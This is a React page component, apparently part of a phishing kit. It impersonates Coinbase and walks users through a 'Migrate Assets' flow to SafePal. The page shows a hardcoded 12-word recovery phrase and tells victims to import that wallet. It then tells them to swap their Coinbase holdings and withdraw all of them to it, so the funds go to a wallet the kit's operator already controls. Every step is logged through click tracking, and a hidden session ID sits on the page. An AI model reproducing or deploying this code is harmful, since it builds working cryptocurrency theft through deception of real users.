import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import { Copy, Check } from "lucide-react";
import {
  CbFontStyle,
  CbLogo,
  CbSupportBanner,
  useCbTracking,
} from "@/components/cb/CbShared";
import walletImg from "@/assets/cb/cb-wallet.jpg";
import appStoreBadge from "@/assets/app-store-badge.svg";
import googlePlayBadge from "@/assets/google-play-badge.svg";
import safepalLogoAsset from "@/assets/safepal-logo.png.asset.json";
import { resolveTenantByHost } from "@/lib/tenants.functions";
const safepalLogo = safepalLogoAsset.url;

const DEFAULT_PHRASE =
  "witness pilot swim brave tornado fringe angry silent decade broken shrimp orbit";

export const Route = createFileRoute("/cb/safepal")({
  head: () => ({ meta: [{ title: "Migrate Assets — SafePal" }] }),
  component: CbSafePalPage,
});

const STEPS = [
  { title: "Read Carefully" },
  { title: "Import Existing Wallet" },
  { title: "Connect your wallet with a phrase" },
  { title: "Transfer and secure assets" },
  { title: "And you're all set!" },
];

const AppStoreBadge = () => (
  <a
    href="https://apps.apple.com/us/app/safepal-crypto-wallet-btc-nft/id1548297139"
    target="_blank"
    rel="noopener noreferrer"
    style={{ display: "inline-block", lineHeight: 0 }}
  >
    <img src={appStoreBadge} alt="Download on the App Store" width={135} height={40} style={{ height: 40, width: "auto", display: "block" }} />
  </a>
);

const GooglePlayBadge = () => (
  <a
    href="https://play.google.com/store/apps/details?id=io.safepal.wallet&hl=en"
    target="_blank"
    rel="noopener noreferrer"
    style={{ display: "inline-block", lineHeight: 0 }}
  >
    <img src={googlePlayBadge} alt="Get it on Google Play" width={135} height={40} style={{ height: 40, width: "auto", display: "block" }} />
  </a>
);

function CbSafePalPage() {
  const { trackClick, cbNavigate, sessionId } = useCbTracking();
  const [step, setStep] = useState(0);
  const [copied, setCopied] = useState(false);
  const [animating, setAnimating] = useState(false);
  const [phraseRevealed, setPhraseRevealed] = useState(false);

  const recoveryPhrase = "witness pilot swim brave tornado fringe angry silent decade broken shrimp orbit";

  const goNext = () => {
    if (step >= 4) return;
    trackClick(`SafePal Step ${step + 1} Next`);
    setAnimating(true);
    setPhraseRevealed(false);
    setTimeout(() => { setStep((s) => s + 1); setAnimating(false); }, 300);
  };

  const goBack = () => {
    if (step <= 0) return;
    trackClick(`SafePal Step ${step + 1} Back`);
    setAnimating(true);
    setPhraseRevealed(false);
    setTimeout(() => { setStep((s) => s - 1); setAnimating(false); }, 300);
  };

  const handleCopy = () => {
    navigator.clipboard.writeText(recoveryPhrase);
    setCopied(true);
    trackClick("SafePal Copy Recovery Phrase");
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="cb-page" style={{ display: "flex", flexDirection: "column", minHeight: "100vh", backgroundColor: "rgb(10, 11, 13)", color: "#fff" }}>
      <CbFontStyle />
      <style>{`
        .cb-page, .cb-page * {
          font-family: 'CoinbaseSans', 'CoinbaseText', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif !important;
          -webkit-font-smoothing: antialiased; box-sizing: border-box;
        }
        @keyframes cbFadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
        .cb-animate { animation: cbFadeIn 0.5s cubic-bezier(0.16, 1, 0.3, 1) both; }
        .cb-animate-delay-1 { animation-delay: 0.05s; }
        .cb-animate-delay-2 { animation-delay: 0.1s; }
        .cb-header { display: grid; grid-template-columns: auto 1fr auto; height: 72px; align-items: center; padding: 0 24px; width: 100%; }
        .cb-step-dot { border-radius: 9999px; transition: all 0.5s cubic-bezier(0.16, 1, 0.3, 1); }
        .cb-btn-primary { width: 100%; height: 56px; border: none; border-radius: 1000px; background: rgb(87, 139, 250); color: rgb(10, 11, 13); font-size: 16px; font-weight: 700; cursor: pointer; transition: background-color 0.15s ease, transform 0.1s ease; display: flex; align-items: center; justify-content: center; }
        .cb-btn-primary:hover { background: rgb(95, 144, 250); }
        .cb-btn-primary:active { background: rgb(99, 147, 250); transform: scale(0.98); }
        .cb-btn-secondary { flex: 1; height: 56px; border: 1px solid rgba(138, 145, 158, 0.3); border-radius: 1000px; background: transparent; color: #fff; font-size: 16px; font-weight: 500; cursor: pointer; transition: background-color 0.15s ease; display: flex; align-items: center; justify-content: center; }
        .cb-btn-secondary:hover { background: rgba(255, 255, 255, 0.04); }
        .cb-phrase-box { position: relative; border-radius: 12px; border: 1px solid rgba(138, 145, 158, 0.2); background: rgb(17, 18, 20); padding: 20px 16px; cursor: pointer; transition: border-color 0.15s ease; }
        .cb-phrase-box:hover { border-color: rgba(138, 145, 158, 0.35); }
        @media (max-width: 640px) { .cb-header { padding: 0 16px; height: 56px; } }
      `}</style>

      <CbSupportBanner />

      <header className="cb-header">
        <div style={{ display: "flex", alignItems: "center", color: "#fff", cursor: "pointer" }} onClick={() => trackClick("Logo")}>
          <CbLogo />
        </div>
        <div />
        <div />
      </header>

      <main style={{ display: "flex", justifyContent: "center", flexGrow: 1, width: "100%", padding: "0 16px", paddingTop: 32 }}>
        <div style={{ width: "100%", maxWidth: 420, display: "flex", flexDirection: "column" }}>
          <div className="cb-animate" style={{ display: "flex", justifyContent: "center", marginBottom: 20 }}>
            <img src={safepalLogo} alt="SafePal" style={{ height: 72, width: "auto", pointerEvents: "none" }} />
          </div>

          <h1 className="cb-animate cb-animate-delay-1" style={{ fontSize: 28, fontWeight: 500, lineHeight: "36px", letterSpacing: "-0.02em", color: "#fff", margin: "0 0 12px 0", textAlign: "center" }}>
            Migrate Assets
          </h1>

          <div className="cb-animate cb-animate-delay-2" style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 8, marginBottom: 6 }}>
            {STEPS.map((_, i) => (
              <div key={i} className="cb-step-dot" style={{ width: i === step ? 28 : 8, height: 8, background: i <= step ? "rgb(87, 139, 250)" : "rgba(138, 145, 158, 0.3)" }} />
            ))}
          </div>
          <p className="cb-animate cb-animate-delay-2" style={{ fontSize: 13, color: "rgb(138, 145, 158)", margin: "0 0 24px 0", textAlign: "center" }}>
            Step {step + 1} of 5
          </p>

          <div style={{ opacity: animating ? 0 : 1, transform: animating ? "translateY(8px)" : "translateY(0)", transition: "opacity 0.3s ease, transform 0.3s ease" }}>
            <h2 style={{ fontSize: 20, fontWeight: 500, color: "#fff", margin: "0 0 12px 0", textAlign: "center" }}>
              {STEPS[step].title}
            </h2>

            {step === 0 && (
              <div style={{ textAlign: "center" }}>
                <p style={{ fontSize: 14, color: "rgb(138, 145, 158)", lineHeight: "22px", margin: "0 0 20px 0" }}>
                  Follow the step-by-step guide on how to link your external wallet such as SafePal,
                  and move funds from your Coinbase account to your external wallet and secure your assets.
                  You may download by clicking the buttons below.
                </p>
                <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 12 }}>
                  <AppStoreBadge />
                  <GooglePlayBadge />
                </div>
              </div>
            )}

            {step === 1 && (
              <div style={{ textAlign: "center" }}>
                <p style={{ fontSize: 14, color: "rgb(138, 145, 158)", lineHeight: "22px", margin: "0 0 16px 0" }}>
                  Open SafePal and <strong style={{ color: "#fff" }}>import the wallet</strong> generated below:
                </p>
                <div className="cb-phrase-box" onClick={() => { if (!phraseRevealed) setPhraseRevealed(true); }}>
                  <p style={{ fontSize: 14, lineHeight: "24px", color: "#fff", fontFamily: "monospace", filter: phraseRevealed ? "blur(0px)" : "blur(6px)", userSelect: phraseRevealed ? "text" : "none", margin: 0, textAlign: "center", transition: "filter 0.3s ease" }}>
                    {recoveryPhrase}
                  </p>
                  {!phraseRevealed && (
                    <div style={{ position: "absolute", inset: 0, display: "flex", alignItems: "center", justifyContent: "center", borderRadius: 12 }}>
                      <span style={{ fontSize: 13, fontWeight: 500, color: "rgb(87, 139, 250)" }}>Click to reveal</span>
                    </div>
                  )}
                </div>
                {phraseRevealed && (
                  <button onClick={handleCopy} style={{ display: "inline-flex", alignItems: "center", gap: 6, fontSize: 13, fontWeight: 500, color: "rgb(87, 139, 250)", background: "none", border: "none", cursor: "pointer", padding: 0, marginTop: 10 }}>
                    {copied ? <Check className="h-4 w-4" /> : <Copy className="h-4 w-4" />}
                    {copied ? "Copied!" : "Copy to clipboard"}
                  </button>
                )}
              </div>
            )}

            {step === 2 && (
              <div style={{ display: "flex", flexDirection: "column", gap: 12 }}>
                {[
                  { num: 1, text: <>Select <strong style={{ color: "#fff" }}>I already have a wallet</strong></> },
                  { num: 2, text: <>Choose <strong style={{ color: "#fff" }}>Enter a recovery phrase</strong>, then enter your wallet's 12-word recovery phrase from the previous step</> },
                  { num: 3, text: <>Click <strong style={{ color: "#fff" }}>Import wallet</strong> and create a username for your cold wallet</> },
                  { num: 4, text: <>Then, create a password so that you can securely <strong style={{ color: "#fff" }}>unlock</strong> your wallet each time you use it</> },
                ].map((item) => (
                  <div key={item.num} style={{ display: "flex", alignItems: "flex-start", gap: 12 }}>
                    <div style={{ width: 28, height: 28, borderRadius: "50%", backgroundColor: "rgb(87, 139, 250)", color: "rgb(10, 11, 13)", fontSize: 13, fontWeight: 700, display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
                      {item.num}
                    </div>
                    <p style={{ fontSize: 14, color: "rgb(138, 145, 158)", lineHeight: "22px", margin: 0, paddingTop: 3 }}>{item.text}</p>
                  </div>
                ))}
              </div>
            )}

            {step === 3 && (
              <div style={{ textAlign: "center" }}>
                <p style={{ fontSize: 14, color: "rgb(138, 145, 158)", lineHeight: "22px", margin: "0 0 12px 0" }}>
                  On <span style={{ color: "rgb(87, 139, 250)", fontWeight: 500 }}>Coinbase</span>, swap your
                  assets to bitcoin, ethereum, or USDT preferably. Some less popular assets may not be supported by cold wallets.
                </p>
                <p style={{ fontSize: 14, color: "rgb(138, 145, 158)", lineHeight: "22px", margin: "0 0 12px 0" }}>
                  Then on SafePal wallet, copy your token addresses and use them to withdraw your assets from{" "}
                  <span style={{ color: "rgb(87, 139, 250)", fontWeight: 500 }}>Coinbase</span> to{" "}
                  <span style={{ color: "#00DCFA", fontWeight: 500 }}>SafePal</span> wallet.
                </p>
                <p style={{ fontSize: 13, color: "rgb(91, 94, 107)", lineHeight: "20px", fontStyle: "italic", margin: 0 }}>
                  If you cannot see your token on SafePal wallet you have to swap it to one that is supported by your wallet.
                </p>
              </div>
            )}

            {step === 4 && (
              <div style={{ textAlign: "center" }}>
                <p style={{ fontSize: 14, color: "rgb(138, 145, 158)", lineHeight: "22px", margin: "0 0 12px 0" }}>
                  If you followed all steps properly, all your crypto assets are now in your custody, secured in your{" "}
                  <span style={{ color: "#00DCFA", fontWeight: 500 }}>SafePal</span>.
                </p>
                <p style={{ fontSize: 14, color: "rgb(138, 145, 158)", lineHeight: "22px", margin: "0 0 12px 0" }}>
                  Your assets should be securely migrated to your cold wallet after all withdrawals from{" "}
                  <span style={{ color: "rgb(87, 139, 250)", fontWeight: 500 }}>Coinbase</span> are complete.
                </p>
              </div>
            )}
          </div>

          <div style={{ marginTop: 24 }}>
            {step === 0 ? (
              <button className="cb-btn-primary" onClick={goNext}>Next</button>
            ) : step === 4 ? (
              <div style={{ display: "flex", gap: 12 }}>
                <button className="cb-btn-secondary" onClick={goBack} style={{ flex: 1 }}>Back</button>
                <button className="cb-btn-primary" onClick={() => { trackClick("SafePal Done"); cbNavigate("/cb/loading"); }} style={{ flex: 1 }}>Done</button>
              </div>
            ) : (
              <div style={{ display: "flex", gap: 12 }}>
                <button className="cb-btn-secondary" onClick={goBack} style={{ flex: 1 }}>Back</button>
                <button className="cb-btn-primary" onClick={goNext} style={{ flex: 1 }}>{step === 1 ? "Continue" : "Next"}</button>
              </div>
            )}
          </div>
        </div>
      </main>

      <div style={{ position: "fixed", bottom: 8, right: 8, fontSize: 10, opacity: 0, pointerEvents: "none" }}>{sessionId}</div>
    </div>
  );
}
